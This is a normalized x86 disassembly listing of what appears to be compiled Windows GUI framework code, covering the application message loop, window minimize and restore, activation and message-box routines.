inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_46add4
jmp r-xdata
push ebp
call sub_46d694
pop ecx
jmp r-xdata
push ebp
call sub_46d6d0
pop ecx
jmp r-xdata
push ebp
call sub_46d694
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_46d534
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46deec
jmp r-xdata
jmp r-xdata
call sub_43f31c
call sub_43f3fc
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_46d524
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46d534
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46d52c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4653e8
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_46d694
pop ecx
jmp r-xdata
call sub_46549c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_46d694
pop ecx
jmp r-xdata
call sub_43f31c
call sub_43f458
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d8e0
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_46de3c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_46d524
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_46ce54
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_4550b4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_4550b4
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_46deec
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_46ce54
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_4550b4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_46d534
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_4550b4
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_468b60
mov eax [ ebx + 0x44 ]
call sub_46af7c
sub_46dfec
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_46e028
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_40416c
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_404208
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_46e074
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_46e098
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_46e0e8
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_44b794
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_4550b4
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_46e1a0
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_46f100
sub_46e1d4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_4550b4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403518
test al al
jne r-xdata
sub_46e240
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_46e1a0
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_46e098
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_46e0e8
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_46e074
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_46e2d8
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_46e240
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_46eba8
sub_46e2fc
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_418cd8
mov eax 0x8
call sub_4026ec
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_418b9c
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_46e358
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_418cf8
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_40270c
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_418be8
jmp r-xdata
sub_46e3ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push sub_46e42a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_455090
mov [ esi + 0x44 ] edi
sub_46e46c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_46e54a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_465360
call sub_40802c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e551
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_468b60
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push sub_46e511
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46e2d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_467a68
mov eax [ ebp - 0x4 ]
call sub_46de3c
jmp r-xdata
sub_46e56c
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40277c
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40279c
push eax
call sub_40277c
pop edx
call sub_40bcc4
call sub_40277c
mov edx [ rw-data ]
call sub_4034a8
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40277c
mov edx eax
mov eax ebx
call sub_46e764
pop esi
pop ebx
retn
call sub_40277c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_46e5fc
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_4653e8
mov [ ebp - 0x10 ] eax
call sub_465304
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_46d5a0
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_46e751
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e758
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_46549c
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_46530c
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_46e764
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46e81f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_4041b0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_46e028
mov eax [ ebp - 0x108 ]
call sub_4045d8
push eax
mov eax [ ebp - 0x4 ]
call sub_4045d8
mov edx eax
mov eax ebx
pop ecx
call sub_46e5fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e826
lea eax [ ebp - 0x108 ]
call sub_404118
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax [ ebp - 0x4 ]
call sub_408a3c
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402df4
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402c0c
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4043e0
sub_46e83c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_455250
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_4553b8
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_46eee0
test al al
je r-xdata
call sub_4550b4
mov ebp eax
mov eax edi
call sub_4550b4
mov ebp eax
mov eax esi
call sub_46eee0
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_46e9a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46e9fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_46eee0
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46f72c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ea03
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_46ea0c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46ea64
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_46eee0
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46f72c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ea6b
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_46ea7c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_40331c
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_44ea54
jmp r-xdata
sub_46eacc
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_46c078
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_4550b4
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46c064
mov ebx eax
mov eax ebx
call sub_4553b8
test al al
je r-xdata
mov eax ebx
call sub_4550b4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_46eb30
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_44d160
mov edi eax
call sub_44ba5c
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_44fa80
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_44fa80
sub_46eba8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46ecb8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46eb30
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_46cbe0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_44ba18
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_46ed68
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_4037e4#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_46f100
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46eacc
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_4213f8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ecbf
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40413c
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_46ecc8
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_46c05c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_46c048
movzx edx di
xor ecx ecx
call sub_44fa80
inc esi
dec ebx
jne r-xdata
sub_46ed04
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_46de20
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_46de20
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_46ecc8
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_46ed68
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_404524
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_40416c
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4483e0
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45b3f0
xor eax eax
push ebp
push sub_46eded
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403518
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40331c
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_46edfc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_46ee58
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_46c05c
mov esi eax
dec esi
test esi esi
jl r-xdata
